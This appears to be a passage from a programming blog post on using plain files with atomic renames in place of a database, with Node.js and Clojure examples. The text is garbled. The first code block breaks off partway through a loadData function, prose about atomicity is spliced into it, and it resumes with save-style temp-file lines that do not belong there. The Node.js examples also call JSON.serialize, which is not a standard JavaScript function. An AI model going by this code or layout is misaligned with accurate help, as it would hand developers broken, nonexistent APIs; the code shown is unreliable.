save and load functions are virtually free! If you’re not familiar with
Clojure, then consider working with pure JSON in Node.js:</p>

<figure><figcaption><span></span></figcaption><div><div><pre><code><span><span>var</span> <span>db</span> <span>=</span> <span>{...};</span>
</span><span>
</span><span><span>function</span> <span>saveData</span><span>()</span> <span>{</span>
</span><span>  <span>fs</span><span>.</span><span>writeFileSync</span><span>(</span><span>"somefile"</span><span>,</span> <span>JSON</span><span>.</span><span>serialize</span><span>(</span><span>db</span><span>));</span>
</span><span><span>}</span>
</span><span>
</span><span><span>function</span> <span>loadData</span><span>()</span> <span>{</span>

<p>Things aren’t quite as easy in languages lacking data literals, but nearly
every popular language has some kind of automatic serialization library.
However, even if you do need to write your own save and load functions, it’s
a pretty straightforward, if somewhat tedious, process.</p>

<p>Even—or especially—experienced programmers are surprised by just how far
this brain-dead-simple durability scheme will go.</p>

<h2>Atomicity</h2>

<p>One other objection to files is that it’s difficult to ensure an application
enjoys the same guarantees that a well-tested ACID database affords. Never mind
the fact that the majority of Rails applications suffer from dozens of
consistency bugs because most developers forget to wrap related updates in
transactions; it is true that incorrectly implemented file IO can cause
catastrophic data loss.</p>

<p>If you plan to deploy spit and slurp into production, you’d be advised to write
to a temporary file and utilize an atomic rename. This ensures that a failure
during writing won’t corrupt your database. See <code>man rename</code> for more.</p>

</span><span>  <span>fs</span><span>.</span><span>writeFileSync</span><span>(</span><span>"somefile.tmp"</span><span>,</span> <span>JSON</span><span>.</span><span>serialize</span><span>(</span><span>db</span><span>));</span>
</span><span>  <span>fs</span><span>.</span><span>renameSync</span><span>(</span><span>"somefile.tmp"</span><span>,</span> <span>"somefile"</span><span>);</span>
</span><span><span>}</span>
</span></code></pre></div></div></figure>


<p>Just this one little tweak and this bad boy is production ready. Clojure
programmers can use Java’s <code>File.renameTo</code> method. See below.</p>

<p>Remember to configure your backups!</p>

<h2>Don’t Stop The World</h2>

<p>Experienced Node.js programmers likely cringed at the “Sync” suffix on the
above file operations. These operations will block while data is being read or
written. In addition to yielding clearer example code, synchronous operations
do not require coordination. If your application only needs to serve a handful
of users, you can still write 100 megabytes of data in less than half a
second. Even if you write every change to a file on every request, your ten
users might not even notice your blocking IO. As you scale up, you’ll need to
either split your data files up and/or start writing files asynchronously.</p>

<p>Asynchronous means coordination. Coordination means locking or queues. This
stuff really isn’t as scary as it sounds, but it will have to wait; this post
has already gotten far too long. However, I don’t want to lead you down the
wrong path, so I should mention that, unlike Node.js, synchronous writes on
the JVM will not block other requests. You practically don’t have a choice, but
to be asynchronous.  If two requests both call your save function at the same
time, the resulting race condition can lead to incremental data loss. Luckily,
Clojure’s agents and persistent data structures provide for a super quick fix:</p>

<figure><figcaption><span></span></figcaption><div><div><pre><code><span><span>(</span><span>import </span><span>'java.io.File</span><span>)</span>
</span><span>
</span><span><span>(</span><span>def </span><span>save-agent</span> <span>(</span><span>agent </span><span>nil</span><span>))</span>
</span><span>
</span><span><span>(</span><span>defn </span><span>save-data</span> <span>[]</span>
</span><span>  <span>(</span><span>send-off </span><span>save-agent</span>
</span><span>    <span>(</span><span>fn </span><span>[</span><span>_</span><span>]</span>
</span><span>      <span>(</span><span>spit</span> <span>"somefile.tmp"</span> <span>(</span><span>prn-str </span><span>@</span><span>db</span><span>))</span>
</span><span>      <span>(</span><span>.renameTo</span> <span>(</span><span>File.</span> <span>"somefile.tmp"</span><span>)</span> <span>(</span><span>File.</span> <span>"somefile"</span><span>)))))</span>
</span></code></pre></div></div></figure>


<p>Different web servers across all the different languages have varying
concurrency support and configuration defaults. Whether or not you use file IO,
you should be aware of the concurrency story for your platform and its impact
on your application.</p>
